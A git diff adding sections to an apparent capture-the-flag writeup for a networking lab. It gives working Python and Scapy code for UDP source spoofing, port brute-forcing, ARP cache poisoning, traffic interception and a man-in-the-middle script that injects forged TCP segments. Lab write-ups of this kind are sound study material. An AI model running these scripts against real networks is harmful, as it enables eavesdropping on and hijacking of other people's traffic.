@@ -252,6 +252,11 @@ send(pkt)
 
 # TCP Handshake
 
+> Complete TCP handshake as a client host.
+
+This writeup is complicated and kind of verbose.  
+But I'm exhausted to make a simpler one after complete the below one by reading the unfriendly doc.
+
 ```py
 """
 https://scapy.readthedocs.io/en/latest/advanced_usage.html#real-example
@@ -307,4 +312,266 @@ class TCP_handshake(Automaton):
 tcp_client = TCP_handshake('10.0.0.2', 31337, 31337, 31337)
 tcp_client.run()
 tcp_client.stop()
+```
+
+# UDP
+
+Just send a UDP packet to where is required in `/challenge/run`.
+
+```py udp.py
+import socket
+
+cli = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+cli.sendto(b"Hello, World!\n", ('10.0.0.2', 31337))
+
+print(cli.recv(1024).decode())
+```
+
+`echo 'python ./udp.py' | /challenge/run`
+
+# UDP 2
+
+```py udp2.py
+import socket
+
+cli = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+cli.bind(("0.0.0.0", 31338))
+cli.sendto(b"Hello, World!\n", ('10.0.0.2', 31337))
+
+print(cli.recv(1024).decode())
+```
+
+`echo 'python ./udp2.py' | /challenge/run`
+
+# UDP Spoofing 1
+
+The client program in `10.0.0.2` is communicating with server `10.0.0.3`.
+
+```py udpspoofing1.py
+import socket
+
+server = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+server.bind(("0.0.0.0", 31337))
+
+while True:
+    server.sendto(b"FLAG", ('10.0.0.2', 31338))
+```
+
+Remember to press `ctrl+c` to stop it.
+
+# UDP Spoofing 2
+
+The client depend on the content in the message received to send its messages.
+
+```py udpspoofing2.py
+import socket
+from threading import Thread
+
+server = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+server.bind(("0.0.0.0", 31337))
+
+def send_udp():
+    while True:
+        server.sendto(b"FLAG:10.0.0.1:31337", ('10.0.0.2', 31338))
+
+def recv_udp():
+    flag = server.recv(1024).decode()
+    print(flag)
+    import os
+    os._exit(0)
+
+sending = Thread(target=send_udp)
+receiving = Thread(target=recv_udp)
+
+sending.start()
+receiving.start()
+```
+
+# UDP Spoofing 3
+
+We don't know the client UDP port.
+
+I tried to use wireshark or nmap to detect the port of the client UDP port, but failed.
+
+```py udpspoofing3.py
+import socket
+from threading import Thread
+from os import _exit
+
+serv_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+serv_sock.bind(('0.0.0.0', 31337))
+
+def send_resp():
+    while True:
+        for cli_port in range(1000, 65535):
+            serv_sock.sendto(b'FLAG:10.0.0.1:31337', ('10.0.0.2', cli_port))
+
+def recv_flag():
+    flag = serv_sock.recv(1024).decode()
+    print(flag)
+    _exit(0)
+
+send_thr = Thread(target=send_resp)
+recv_thr = Thread(target=recv_flag)
+
+send_thr.start()
+recv_thr.start()
+```
+
+# UDP Spoofing 4
+
+The client check if the IP is true. But we can use scapy to forge the IP packet.  
+There is another question that scapy is very slow to send 60 thousand of packets. But using multithreading can solve the problem.
+
+```py udpspoofing4.py
+from scapy.all import *
+import socket
+from threading import Thread
+from os import _exit
+
+listen_ip = '0.0.0.0'
+listen_port = 9999
+
+src_ip = '10.0.0.3'
+src_port = 31337
+
+dst_ip = '10.0.0.2'
+
+def process_bar(start, end, now):
+    rate = (now-start) / (end-start)
+    print(f"\r|{'#'*round(50*rate):50}| {1+now-start}/{end-start}", end='')
+
+def try_send(start_port, end_port):
+    while True:
+        for try_port in range(start_port, end_port):
+            pkt = IP(src=src_ip, dst=dst_ip)/ \
+                  UDP(sport=src_port, dport=try_port)/ \
+                  f"FLAG:10.0.0.1:{listen_port}".encode()
+            send(pkt, verbose=0)
+
+def recv():
+    serv_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    serv_sock.bind((listen_ip, listen_port))
+    while True:
+        print(serv_sock.recv(1024).decode())
+        _exit(0)
+
+# Linux temp port range
+start_port = 32768
+end_port = 60999
+port_interval = 100
+
+threads = []
+# for try_port in range(32700, 61000):
+st, ed = start_port // port_interval, end_port // port_interval
+for i in range(st, ed+1):
+    process_bar(st, ed, i); print(f', port {i*port_interval} to {(i+1)*port_interval}', end='')
+    thr = Thread(target=try_send, args=[i*100, (i+1)*100])
+    thr.start()
+    threads.append(thr)
+print('\nwait collision...')
+
+recv_thr = Thread(target=recv)
+recv_thr.start()
+```
+
+The above codes cost about two minute to get the flag.
+
+# ARP
+
+```py arp.py
+from scapy.all import *
+
+pkt = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst='10.0.0.2', psrc='10.0.0.42', hwsrc='42:42:42:42:42:42', op=2)
+sendp(pkt, iface='eth0')
+```
+
+# Intercept
+
+There is a client(`10.0.0.2`) is sending flag to server(`10.0.0.3`) by TCP.
+
+First make a fake IP `10.0.0.3` by `ip addr add 10.0.0.3 dev eth0`. Actually, it is `10.0.0.3/32` other than `10.0.0.3/24`.
+
+Then use ARP poisoning to let client send the flag to me.
+
+```py intercept.py
+from scapy.all import *
+from threading import Thread
+import socket
+from os import _exit
+
+def send_arp():
+    sendp(
+        # let the client 10.0.0.2 believe that 10.0.0.3 is at my mac.
+        # the mac address is got by `ip addr`
+        Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst='10.0.0.2', psrc='10.0.0.3', hwsrc='6a:e6:98:1d:67:d0', op=2),
+        iface='eth0'
+    )
+
+def recv_flag():
+    sock = socket.socket()
+    sock.bind(('0.0.0.0', 31337))
+    sock.listen()
+    while True:
+        try:
+            connection, _ = sock.accept()
+            msg = connection.recv(1024)
+            print(msg.decode())
+            _exit(0)
+        except ConnectionError:
+            continue
+
+send_thr = Thread(target=send_arp)
+recv_thr = Thread(target=recv_flag)
+
+send_thr.start()
+recv_thr.start()
+```
+
+# Man-in-the-Middle
+
+There is another way to do use `op=1` for ARP poisoning.
+
+```py maninthemiddle.py
+from scapy.all import *
+from os import _exit
+
+BROADCAST = 'ff:ff:ff:ff:ff:ff'
+MY_MAC = get_if_hwaddr('eth0')
+
+cli_ip = '10.0.0.2'
+ser_ip = '10.0.0.3'
+
+def arp_poisoning(src, dst, forge_mac):
+    sendp(
+        Ether(dst=BROADCAST, src=MY_MAC) /
+            ARP(pdst=dst, psrc=src, hwsrc=forge_mac, op=1),
+        iface='eth0'
+    )
+
+def recv_in_middle(pkt):
+    if 'TCP' in pkt and 'Raw' in pkt:
+        payload = pkt[Raw].load
+        print(f'\nfrom {pkt[IP].src} to {pkt[IP].dst}')
+        print(f'seq {pkt[TCP].seq}, ack {pkt[TCP].ack}')
+        print(payload)
+        if b'pwn' in payload:
+            print(payload.decode())
+            _exit(0)
+        if pkt[IP].src == ser_ip and b'command' in payload:
+            ip = IP(src=cli_ip, dst=ser_ip)
+            tcp = pkt[TCP].copy()
+            del tcp[Raw]
+            tcp.sport, tcp.dport = pkt[TCP].dport, pkt[TCP].sport
+            tcp.seq, tcp.ack = pkt[TCP].ack, pkt[TCP].seq+len(payload)
+            tcp.chksum = None
+            send(
+                ip / tcp / b'flag',
+                iface='eth0')
+        
+
+arp_poisoning(cli_ip, ser_ip, MY_MAC),
+arp_poisoning(ser_ip, cli_ip, MY_MAC)
+
+sniff(prn=recv_in_middle, iface='eth0')
 ```
